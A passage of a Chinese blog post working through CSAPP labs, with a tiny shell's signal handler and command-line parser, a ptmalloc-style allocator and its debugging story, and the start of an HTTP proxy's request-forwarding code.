class="line">    <span class="keyword">return</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * sigtstp_handler - The kernel sends a SIGTSTP to the shell whenever</span></span><br><span class="line"><span class="comment"> *     the user types ctrl-z at the keyboard. Catch it and suspend the</span></span><br><span class="line"><span class="comment"> *     foreground job by sending it a SIGTSTP.  </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">sigtstp_handler</span><span class="params">(<span class="type">int</span> sig)</span> </span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">if</span>(verbose)</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"sigstp_handler: entering"</span>);</span><br><span class="line">    <span class="type">pid_t</span> pid = <span class="built_in">fgpid</span>(jobs);</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">job_t</span>* job = <span class="built_in">getjobpid</span>(jobs,pid);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(pid)</span><br><span class="line">    {</span><br><span class="line">        <span class="comment">//pid设置为负,将信号发送给整个进程组.</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">kill</span>(-pid,SIGTSTP)&lt;<span class="number">0</span>)</span><br><span class="line">        {</span><br><span class="line">            <span class="built_in">unix_error</span>(<span class="string">"kill (tstp) error"</span>);</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">if</span>(verbose){</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"sigstp_handler: Job [%d] (%d) stopped\n"</span>, job-&gt;jid, pid);</span><br><span class="line">            }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(verbose)</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"sigstp_handler: exiting"</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="parseline"><a href="#parseline" class="headerlink" title="parseline"></a>parseline</h3><p>lab直接给出的,学一下实现.</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * parseline - Parse the command line and build the argv array.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * Characters enclosed in single quotes are treated as a single</span></span><br><span class="line"><span class="comment"> * argument.  Return true if the user has requested a BG job, false if</span></span><br><span class="line"><span class="comment"> * the user has requested a FG job.  </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">parseline</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *cmdline, <span class="type">char</span> **argv)</span> </span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="type">static</span> <span class="type">char</span> array[MAXLINE]; <span class="comment">/* holds local copy of command line */</span></span><br><span class="line">    <span class="type">char</span> *buf = array;          <span class="comment">/* ptr that traverses command line */</span></span><br><span class="line">    <span class="type">char</span> *delim;                <span class="comment">/* points to first space delimiter */</span></span><br><span class="line">    <span class="type">int</span> argc;                   <span class="comment">/* number of args */</span></span><br><span class="line">    <span class="type">int</span> bg;                     <span class="comment">/* background job? */</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">strcpy</span>(buf, cmdline);</span><br><span class="line">    buf[<span class="built_in">strlen</span>(buf)<span class="number">-1</span>] = <span class="string">' '</span>;  <span class="comment">/* replace trailing '\n' with space */</span></span><br><span class="line">    <span class="keyword">while</span> (*buf &amp;&amp; (*buf == <span class="string">' '</span>)) <span class="comment">/* ignore leading spaces */</span></span><br><span class="line">buf++;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Build the argv list */</span></span><br><span class="line">    argc = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (*buf == <span class="string">'\''</span>) {</span><br><span class="line">buf++;</span><br><span class="line">delim = <span class="built_in">strchr</span>(buf, <span class="string">'\''</span>);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span> {</span><br><span class="line">delim = <span class="built_in">strchr</span>(buf, <span class="string">' '</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (delim) {</span><br><span class="line">argv[argc++] = buf;</span><br><span class="line">*delim = <span class="string">'\0'</span>;</span><br><span class="line">buf = delim + <span class="number">1</span>;</span><br><span class="line"><span class="keyword">while</span> (*buf &amp;&amp; (*buf == <span class="string">' '</span>)) <span class="comment">/* ignore spaces */</span></span><br><span class="line">       buf++;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (*buf == <span class="string">'\''</span>) {</span><br><span class="line">    buf++;</span><br><span class="line">    delim = <span class="built_in">strchr</span>(buf, <span class="string">'\''</span>);</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span> {</span><br><span class="line">    delim = <span class="built_in">strchr</span>(buf, <span class="string">' '</span>);</span><br><span class="line">}</span><br><span class="line">    }</span><br><span class="line">    argv[argc] = <span class="literal">NULL</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (argc == <span class="number">0</span>)  <span class="comment">/* ignore blank line */</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* should the job run in the background? */</span></span><br><span class="line">    <span class="keyword">if</span> ((bg = (*argv[argc<span class="number">-1</span>] == <span class="string">'&amp;'</span>)) != <span class="number">0</span>) {</span><br><span class="line">argv[--argc] = <span class="literal">NULL</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> bg;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h1 id="Lab7-Malloc-lab"><a href="#Lab7-Malloc-lab" class="headerlink" title="Lab7:Malloc lab"></a>Lab7:Malloc lab</h1><h2 id="设计"><a href="#设计" class="headerlink" title="设计"></a>设计</h2><p>参照ptmalloc.</p><h3 id="堆块结构"><a href="#堆块结构" class="headerlink" title="堆块结构"></a>堆块结构</h3><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202306221858686.png"></p><h3 id="空闲块组织"><a href="#空闲块组织" class="headerlink" title="空闲块组织"></a>空闲块组织</h3><p>分为fastbins和bins,fastbins不参与合并不进行切割.两者均采用单向链表的组织结构,fastbins有7个,由于堆块对齐的原因各个fastbins中chunk大小相同,故不需排序,从头部取出或放入.bins有8个,需排序.</p><h2 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h2><p>第一次跑过所有测试,80分,但此时还没有加入空闲块合并的功能.<br>查看util极低的数据,观察发现确实是空闲块未合并导致的.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202306211450673.png"></p><p>加入空闲块合并之后,好的,降了10分<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202306221745035.png"><br>发现原因是因为我的设计大部分参考的是glibc中ptmalloc的实现,注重查找的效率,但由于我本地的机器较快导致性能一直是满分,所以评分仅取决于空间利用率.</p><p>所以一些设计比如增加bin的数量(将空闲块按大小分区间组织加快查找速度),设计fastbin不参与合并加快速度,分配较大的top chunk减少mem_sbrk的调用次数(其实没有必要,ptmalloc这样实现是为了减少sbrk或mmap系统调用的开销,而本实验中的mm_malloc是建立在一个模拟的mem_sbrk之上,并不会进行系统调用)等,反而降低了空间利用率.</p><p>这是将fastbins和bins数量均减为1,topchunk默认大小改为0x1000后的成绩.可见空间利用率大幅提升.</p><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202306221847904.png"></p><p>还有很多可以完善的地方,不过现阶段对算法和数据结构的理解还不够,没办法自己设计,照着ptmalloc2写一份也没有太多意义.等之后看有没有机会实现一个完整的,直接使用系统调用的.</p><h3 id="一些debug插曲"><a href="#一些debug插曲" class="headerlink" title="一些debug插曲"></a>一些debug插曲</h3><h4 id="1"><a href="#1" class="headerlink" title="1"></a>1</h4><p>(高达5220%的内存利用率的超级内存分配器<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202306202159747.png"></p><p>一部分trace测试因分配到了brk更高地址被终止.<br>另一部分则发生段错误造成crash,测试这部分样例.<br>直接run起来,观察崩溃点,发现程序在访问(eax+4)内存时发生段错误,该表达式对应为top-&gt;size.即eax表示top的值为0.<br>top指针在初始化之后肯定是不可能为0的.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202306202147605.png"><br>设置观察点:watch (top==0),重新运行程序.<br>发现程序在此处停住,但源码中并没有top作为左值的语句.<br>瞬间反应过来,bins下标越界.<br>改掉程序中对i的检查.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202306202152686.png"></p><h4 id="2"><a href="#2" class="headerlink" title="2"></a>2</h4><p>然而我调试了接近两个小时后,发现最关键的问题在mdriver程序会多次调用mm_init函数,且在调用前将mem_brk复位,而我的init函数只是为调用一次使用的,并没有清空bins和top,导致多次运行时使用大量mem_brk之外的内存……<br>这才是上面内存利用率超高的原因.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202306210005305.png"></p><p>不过两小时也没白费,学了好多诸如watchpoints的调试命令和找到一些调试技巧.</p><h4 id="3"><a href="#3" class="headerlink" title="3"></a>3</h4><p>重写init函数,再次运行,不出意外的异常退出.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202306210007226.png"><br>不过只在部分样例中异常退出,原因是ran out of memory.这倒是很正常,因为此时还没有编写空闲块合并和realloc的功能<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202306210008744.png"></p><h4 id="4"><a href="#4" class="headerlink" title="4"></a>4</h4><p>编写realloc功能后运行崩溃,调试发现是realloc时没有做边界检查,如果下一个chunk是topchunk将会在切割后unlink(topchunk),而topchunk自然是不会在bin中的故引发”mm_unlink: nonexistent mptr”</p><h4 id="5"><a href="#5" class="headerlink" title="5"></a>5</h4><p>在mm_realloc和mm_malloc里调用mm_free时,应该使用用户态的指针而不是堆块头部指针…..感觉这是个挺容易犯错的地方</p><h1 id="Lab8-Proxy-lab"><a href="#Lab8-Proxy-lab" class="headerlink" title="Lab8:Proxy lab"></a>Lab8:Proxy lab</h1><h2 id="Part-A-2"><a href="#Part-A-2" class="headerlink" title="Part A"></a>Part A</h2><h3 id="设计-1"><a href="#设计-1" class="headerlink" title="设计"></a>设计</h3><p>使用的结构为</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> </span><br><span class="line">{</span><br><span class="line">    <span class="type">char</span> method[MAXLINE];</span><br><span class="line">    <span class="type">char</span> host[MAXLINE];</span><br><span class="line">    <span class="type">char</span> port[MAX_PORTLEN];</span><br><span class="line">    <span class="type">char</span> path[MAXLINE];</span><br><span class="line">    <span class="type">char</span> cgiargs[MAXLINE];</span><br><span class="line">    <span class="type">char</span> version[MAXLINE];</span><br><span class="line">}RequestLine;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> </span><br><span class="line">{</span><br><span class="line">    <span class="type">char</span> name[MAXLINE];</span><br><span class="line">    <span class="type">char</span> value[MAXLINE];</span><br><span class="line">}RequestHeader;</span><br></pre></td></tr></tbody></table></figure><p>这是整个PartA的处理流程,其中Forward2Client未做处理,直接将从服务器收到的数据原封不动转发给客户端.Part A完成后程序已经可以在浏览器中实现代理访问.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202306240020148.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202306240023578.png"></p><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">"csapp.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Recommended max cache and object sizes */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_CACHE_SIZE 1049000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_OBJECT_SIZE 102400</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_PORTLEN 10</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_HEADERS 30</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PREFIX_PRINT <span class="string">"HanQi_Proxy &gt; "</span></span></span><br><span class="line"><span class="comment">/* You won't lose style points for including this long line in your code */</span></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="type">char</span> *user_agent_hdr = <span class="string">"User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:10.0.3) Gecko/20120305 Firefox/10.0.3"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> </span><br><span class="line">{</span><br><span class="line">    <span class="type">char</span> method[MAXLINE];</span><br><span class="line">    <span class="type">char</span> host[MAXLINE];</span><br><span class="line">    <span class="type">char</span> port[MAX_PORTLEN];</span><br><span class="line">    <span class="type">char</span> path[MAXLINE];</span><br><span class="line">    <span class="type">char</span> cgiargs[MAXLINE];</span><br><span class="line">    <span class="type">char</span> version[MAXLINE];</span><br><span class="line">}RequestLine;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> </span><br><span class="line">{</span><br><span class="line">    <span class="type">char</span> name[MAXLINE];</span><br><span class="line">    <span class="type">char</span> value[MAXLINE];</span><br><span class="line">}RequestHeader;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">"proxy.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">parse_uri</span><span class="params">(<span class="type">char</span> uri[],RequestLine* requestline)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="type">char</span>* address_ptr = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">char</span>* port_ptr = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">char</span>* path_ptr = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(address_ptr = <span class="built_in">strstr</span>(uri,<span class="string">"//"</span>))</span><br><span class="line">        address_ptr += <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        address_ptr = uri;</span><br><span class="line">    <span class="keyword">if</span>(port_ptr = <span class="built_in">strstr</span>(address_ptr,<span class="string">":"</span>))</span><br><span class="line">        port_ptr += <span class="number">1</span>;</span><br><span class="line">    path_ptr = <span class="built_in">strstr</span>(address_ptr,<span class="string">"/"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(path_ptr!=<span class="literal">NULL</span>)</span><br><span class="line">        <span class="built_in">strncpy</span>(requestline-&gt;path,path_ptr,MAXLINE);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">strncpy</span>(requestline-&gt;path,<span class="string">"/"</span>,<span class="number">2</span>);</span><br><span class="line">        path_ptr = address_ptr+<span class="built_in">strlen</span>(address_ptr);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">if</span>(port_ptr!=<span class="literal">NULL</span>)</span><br><span class="line">        <span class="built_in">strncpy</span>(requestline-&gt;port,port_ptr,path_ptr-port_ptr);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">strncpy</span>(requestline-&gt;port,<span class="string">"80"</span>,<span class="number">3</span>);</span><br><span class="line">        port_ptr = path_ptr;</span><br><span class="line">    }</span><br><span class="line">    <span class="built_in">strncpy</span>(requestline-&gt;host,address_ptr,port_ptr-address_ptr<span class="number">-1</span>);</span><br><span class="line">    <span class="built_in">printf</span>(PREFIX_PRINT<span class="string">"RequestTarget: %s:%s%s\n"</span>,requestline-&gt;host,requestline-&gt;port,requestline-&gt;path);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">read_requesthdrs</span><span class="params">(<span class="type">rio_t</span>* rio,RequestHeader requestheaders[MAX_HEADERS])</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span> buf[MAXLINE];</span><br><span class="line">    <span class="built_in">Rio_readlineb</span>(rio,buf,MAXLINE);</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">strcmp</span>(<span class="string">"\r\n"</span>,buf))</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">sscanf</span>(buf,<span class="string">"%[^:]: %s\r\n"</span>,requestheaders[i].name,requestheaders[i].value);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%s: %s\r\n"</span>,requestheaders[i].name,requestheaders[i].value);</span><br><span class="line">        ++i;</span><br><span class="line">        <span class="keyword">if</span>(i==MAX_HEADERS)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="built_in">Rio_readlineb</span>(rio,buf,MAXLINE);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> i;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">add_headers</span><span class="params">(RequestHeader requestheaders[MAX_HEADERS],<span class="type">int</span>* headers_num,<span class="type">char</span>* headername,<span class="type">char</span>* headervalue)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i&lt;MAX_HEADERS;++i)</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(headername,requestheaders[i].name))</span><br><span class="line">        {</span><br><span class="line">            <span class="built_in">strncpy</span>(requestheaders[i].value,headervalue,MAXLINE);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="built_in">strncpy</span>(requestheaders[*headers_num].name,headername,MAXLINE);</span><br><span class="line">    <span class="built_in">strncpy</span>(requestheaders[*headers_num].value,headervalue,MAXLINE);</span><br><span class="line">    ++(*headers_num);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Write2Server</span><span class="params">(<span class="type">int</span> server_fd,RequestLine* requestline,RequestHeader requestheaders[],<span class="type">int</span> headers_num)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="built_in">printf</span>(PREFIX_PRINT<span class="string">"Forwarding to %s:%s,ing...\n"</span>,requestline-&gt;host,requestline-&gt;port);</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">3</span>*MAXLINE+<span class="number">5</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">//这里不是很懂,最后转发给服务器的uri只留下文件路径?</span></span><br><span class="line">    <span class="built_in">snprintf</span>(buf,<span class="number">3</span>*MAXLINE+<span class="number">5</span>,<span class="string">"%s %s %s\r\n"</span>,requestline-&gt;method,requestline-&gt;path,requestline-&gt;version);    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s"</span>,buf);</span><br><span class="line">    <span class="built_in">Rio_writen</span>(server_fd,buf,<span class="built_in">strlen</span>(buf));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i&lt;headers_num;++i)</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">snprintf</span>(buf,<span class="number">3</span>*MAXLINE+<span class="number">5</span>,<span class="string">"%s: %s\r\n"</span>,requestheaders[i].name,requestheaders[i].value);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%s"</span>,buf);</span><br><span class="line">        <span class="built_in">Rio_writen</span>(server_fd,buf,<span class="built_in">strlen</span>(buf));</span><br><span class="line">    }</span><br><span class="line">    <span class="built_in">Rio_writen</span>(server_fd,<span class="string">"\r\n"</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\r\n"</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Forward2Client</span><span class="params">(<span class="type">int</span> client_fd,<span class="type">int</span> server_fd)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="type">int</span> headers_num = <span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">2</span>*MAXLINE+<span class="number">5</span>];</span><br><span class="line">    <span class="type">rio_t</span> server_rio;</span><br><span class="line">    <span class="type">int</span> size = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(PREFIX_PRINT<span class="string">"Forwarding to Client,ing...\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">Rio_readinitb</span>(&amp;server_rio,server_fd);</span><br><span class="line">    <span class="built_in">Rio_readlineb</span>(&amp;server_rio,buf,<span class="number">2</span>*MAXLINE+<span class="number">5</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s"</span>,buf);</span><br><span class="line">    <span class="built_in">Rio_writen</span>(client_fd,buf,<span class="built_in">strlen</span>(buf));</span><br><span class="line">    <span class="comment">// headers_num = read_requesthdrs(&amp;server_rio,headers);</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">Rio_readlineb</span>(&amp;server_rio,buf,<span class="number">2</span>*MAXLINE+<span class="number">5</span>);</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">strcmp</span>(<span class="string">"\r\n"</span>,buf))</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%s"</span>,buf);</span><br><span class="line">        <span class="built_in">Rio_writen</span>(client_fd,buf,<span class="built_in">strlen</span>(buf));</span><br><span class="line">        <span class="built_in">Rio_readlineb</span>(&amp;server_rio,buf,<span class="number">2</span>*MAXLINE+<span class="number">5</span>);</span><br><span class="line">    }</span><br><span class="line">    <span class="built_in">Rio_writen</span>(client_fd,<span class="string">"\r\n"</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\r\n"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span>(size = <span class="built_in">Rio_readlineb</span>(&amp;server_rio,buf,MAXLINE))</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%s"</span>,buf);</span><br><span class="line">        <span class="built_in">Rio_writen</span>(client_fd,buf,size);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span>* <span class="title">StartWork</span><span class="params">(<span class="type">int</span> connfd)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="type">char</span> buf[MAXLINE],uri[MAXLINE];</span><br><span class="line">    RequestLine requestline;</span><br><span class="line">    RequestHeader requestheaders[MAX_HEADERS];</span><br><span class="line">    <span class="type">rio_t</span> 